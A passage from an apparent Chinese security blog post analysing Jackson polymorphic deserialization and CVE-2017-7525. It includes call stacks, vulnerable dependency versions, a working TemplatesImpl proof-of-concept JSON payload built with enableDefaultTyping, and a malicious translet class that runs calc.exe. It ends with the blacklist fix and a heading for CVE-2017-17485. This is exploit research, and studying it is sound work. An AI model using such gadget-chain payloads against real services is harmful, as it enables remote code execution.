class="keyword">return</span> <span class="built_in">this</span>.deserializeFromNumber(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> VALUE_NUMBER_FLOAT:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.deserializeFromDouble(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> VALUE_EMBEDDED_OBJECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.deserializeFromEmbedded(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> VALUE_TRUE:</span><br><span class="line">            <span class="keyword">case</span> VALUE_FALSE:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.deserializeFromBoolean(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> VALUE_NULL:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.deserializeFromNull(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> START_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>._deserializeFromArray(p, ctxt);</span><br><span class="line">            <span class="keyword">case</span> FIELD_NAME:</span><br><span class="line">            <span class="keyword">case</span> END_OBJECT:</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>._vanillaProcessing) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.vanillaDeserialize(p, ctxt, t);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>._objectIdReader != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.deserializeWithObjectId(p, ctxt);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.deserializeFromObject(p, ctxt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当JSON数据不是标准的java对象时，根据 JSON 的不同数据类型，分发到对应的处理方法。</p>
+<p>在多态反序列化的某些复杂场景下，比如当 TypeDeserializer 已经利用 TokenBuffer 处理完了所有数据，或者解析器序列正好把指针留在了结束符 } 上时，Jackson 会发现当前已经没有字段可读了。为了完成反序列化流程，它会进入这个方法并匹配到<code>case END_OBJECT</code>分支，然后调用 vanillaDeserialize。此时，Jackson 会直接实例化对象并立即跳过字段填充循环，最终返回一个新建的对象实例，接着再次触发<code>prop.deserializeAndSet(p, ctxt, bean);</code></p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206195404347.png" alt="image-20251206195404347"></p>
+<p>最终触发到 setter 方法</p>
+<h2 id="反序列化调用栈"><a href="#反序列化调用栈" class="headerlink" title="反序列化调用栈"></a>反序列化调用栈</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">at org.Polymorphism.JsonTypeInfo.EvilDeduction.setCmd(EvilDeduction.java:<span class="number">19</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">497</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.impl.MethodProperty.deserializeAndSet(MethodProperty.java:<span class="number">141</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:<span class="number">313</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeOther(BeanDeserializer.java:<span class="number">214</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:<span class="number">186</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer._deserializeTypedForId(AsPropertyTypeDeserializer.java:<span class="number">144</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.jsontype.impl.AsDeductionTypeDeserializer.deserializeTypedFromObject(AsDeductionTypeDeserializer.java:<span class="number">140</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer.deserializeTypedFromAny(AsPropertyTypeDeserializer.java:<span class="number">213</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.std.UntypedObjectDeserializer$Vanilla.deserializeWithType(UntypedObjectDeserializer.java:<span class="number">781</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.impl.FieldProperty.deserializeAndSet(FieldProperty.java:<span class="number">147</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:<span class="number">313</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:<span class="number">176</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.DefaultDeserializationContext.readRootValue(DefaultDeserializationContext.java:<span class="number">323</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:<span class="number">4674</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:<span class="number">3629</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:<span class="number">3597</span>)</span><br><span class="line">at org.Polymorphism.JsonTypeInfo.DemoIdDeduction.main(DemoIdDeduction.java:<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。</p>
+<p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p>
+<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="CVE-2017-7525（基于TemplatesImpl利用链）"></a>CVE-2017-7525（基于TemplatesImpl利用链）</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p>
+<p>Jackson 2.7系列 &lt; 2.7.9.1</p>
+<p>Jackson 2.8系列 &lt; 2.8.8.1</p>
+<p>JDK版本为1.7</p>
+<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="链子寻找"><a href="#链子寻找" class="headerlink" title="链子寻找"></a>链子寻找</h3><p>根据以往对TemplatesImpl利用链的操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">    setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;wanth3f1ag&quot;</span>);</span><br><span class="line">    setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实不难知道这三个必要属性都是通过setter方法去设置的，并且这三个属性任意一个为null都会导致空指针异常错误抛出</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206200722360.png" alt="image-20251206200722360"></p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206200812547.png" alt="image-20251206200812547"></p>
+<p>_tfactory默认为null，但在较早的时候不需要 _tfactory 属性，那如何触发getOutputProperties呢？</p>
+<p>关注到<code>SetterlessProperty#deserializeAndSet</code></p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206201634949.png" alt="image-20251206201634949"></p>
+<p>对于变量<code>outputProperties</code>并没有对应的<code>setter</code>方法，此时他就会去调用<code>getter</code>方法，也就是开始了getOutputProperties()链，这就是该利用链能被成功触发的原因。</p>
+<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\java\\JavaSec\\JavaSerialize\\target\\classes\\SerializeChains\\JacksonNativeSer\\calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;wanth3f1ag&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();    <span class="comment">//三个条件之一</span></span><br><span class="line"></span><br><span class="line">        mapper.readValue(jsonInput, Test1.class);   <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(cls));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(bytes);  <span class="comment">// 你现在用的这个 Base64</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">calc</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206203552203.png" alt="image-20251206203552203"></p>
+<p>我后面换成高版本的JDK试了一下，运行失败并抛出报错</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206203945056.png" alt="image-20251206203945056"></p>
+<p>意思就是<code>_tfactory</code> 字段为null导致抛出空指针报错。在jdk1.8某个版本后，defineTransletClasses()中新增了对<code>_tfactory</code>的处理，但是无法给它赋值，所以会抛出异常，导致poc无法生效。</p>
+<p>函数调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:<span class="number">431</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">57</span>)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">601</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.impl.SetterlessProperty.deserializeAndSet(SetterlessProperty.java:<span class="number">105</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:<span class="number">260</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:<span class="number">125</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.jsontype.impl.AsArrayTypeDeserializer._deserialize(AsArrayTypeDeserializer.java:<span class="number">110</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.jsontype.impl.AsArrayTypeDeserializer.deserializeTypedFromAny(AsArrayTypeDeserializer.java:<span class="number">68</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.std.UntypedObjectDeserializer$Vanilla.deserializeWithType(UntypedObjectDeserializer.java:<span class="number">554</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.SettableBeanProperty.deserialize(SettableBeanProperty.java:<span class="number">493</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.impl.FieldProperty.deserializeAndSet(FieldProperty.java:<span class="number">101</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:<span class="number">260</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:<span class="number">125</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose(ObjectMapper.java:<span class="number">3807</span>)</span><br><span class="line">at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:<span class="number">2797</span>)</span><br><span class="line">at SerializeChains.JacksonNativeSer.TemplatesImpl_POC.main(TemplatesImpl_POC.java:<span class="number">25</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="修复补丁"><a href="#修复补丁" class="headerlink" title="修复补丁"></a>修复补丁</h3><p>把版本换成任意一个修复版本，我这里换成了2.7.9.1</p>
+<p>发现增加了黑名单过滤</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251206205411321.png" alt="image-20251206205411321"></p>
+<h2 id="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"><a href="#CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）" class="headerlink" title="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"></a>CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.7系列 &lt; 2.7.9.2</p>
+<p>Jackson 2.8系列 &lt; 2.8.11</p>
+<p>Jackson 2.9系列 &lt; 2.9.4</p>
+<p>可直接在JDK1.8上运行。</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/jackson-basics/">https://baozongwi.xyz/p/jackson-basics/</a></p>
+<p><a target="_blank" rel="noopener" href="https://infernity.top/2025/03/05/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://infernity.top/2025/03/05/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12412">https://xz.aliyun.com/news/12412</a></p>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/12/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化之Jackson反序列化">https://wanth3f1ag.top/2025/12/05/Java反序列化之Jackson反序列化/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># java反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/12/05/PolarCTF2025%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" rel="prev" title="PolarCTF2025夏季个人挑战赛web题解">
+                  <i class="fa fa-angle-left"></i> PolarCTF2025夏季个人挑战赛web题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.1m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">47:23</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
